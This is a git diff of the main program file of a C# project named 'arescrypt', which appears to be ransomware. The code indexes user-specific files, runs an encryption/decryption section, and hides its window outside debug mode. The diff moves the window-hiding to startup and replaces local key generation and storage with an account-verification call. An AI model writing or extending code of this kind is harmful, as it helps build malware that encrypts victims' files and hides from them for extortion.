@@ -8,16 +8,15 @@ namespace arescrypt
     class Program
     {
         // Predefinitions
-        public static string sessionDomain = Environment.UserDomainName; // get current sessions domain
-        public static string sessionUsername = Environment.UserName; // get current sessions username
         static Configuration config = new Configuration(); // New instance of Configuration class
         static Cryptography crypto = new Cryptography(); // New instance of Cryptography class
         static UserData userData = new UserData();
+        static AccountManager accountManager = new AccountManager();
 
         static void Main(string[] args)
         {
             // Welcome message
-            Console.Write("Hello, " + sessionDomain + @"\" + sessionUsername);
+            Console.Write("Hello, " + Configuration.userDomUser);
 #if DEBUG
             Console.Write(". DEBUG mode has been enabled.\n");
 #else
@@ -25,6 +24,9 @@ namespace arescrypt
 #endif
             Console.WriteLine("Current path is: " + Configuration.currentWorkingDirectory + "\n");
             // End welcome message
+
+            if (!config.debugMode)
+                Miscellaneous.HideWindow();
 
             var userSpecificDirs = new List<string> { "" };
             string[] fullFileIndex = { "" };
@@ -56,24 +58,7 @@ namespace arescrypt
             fullFileIndex = userSpecificFiles.ToArray();
             
             /* BEGIN ENCRYPTION/DECRYPTION SECTION */
-            string encKey = Cryptography.genRandomString(0xC);
-            
-            if (!File.Exists(Configuration.datFileLocation))
-            {
-                userData.uniqueKey = encKey;
-
-                Console.WriteLine("No DAT file discovered, creating one now..");
-                Miscellaneous.SetDATFileData(userData);
-                Console.WriteLine("DAT file created [" + Configuration.datFileLocation + "]");
-            } else
-            {
-                Console.WriteLine("Reading dat file...");
-                UserData serveJSONData = Miscellaneous.GetDATFileData();
-                userData.uniqueKey = serveJSONData.uniqueKey;
-            }
-
-            Console.WriteLine("Unique Key: " + userData.uniqueKey);
-
+            accountManager.CheckVerification();
 
             // Cryptography.executeExample(); // Execute cryptography example
 
@@ -98,7 +83,6 @@ namespace arescrypt
             }
             else if (!config.debugMode) // == false
             {
-                Miscellaneous.HideWindow();
                 Application.EnableVisualStyles();
                 Application.SetCompatibleTextRenderingDefault(false);
                 Application.Run(new Display());
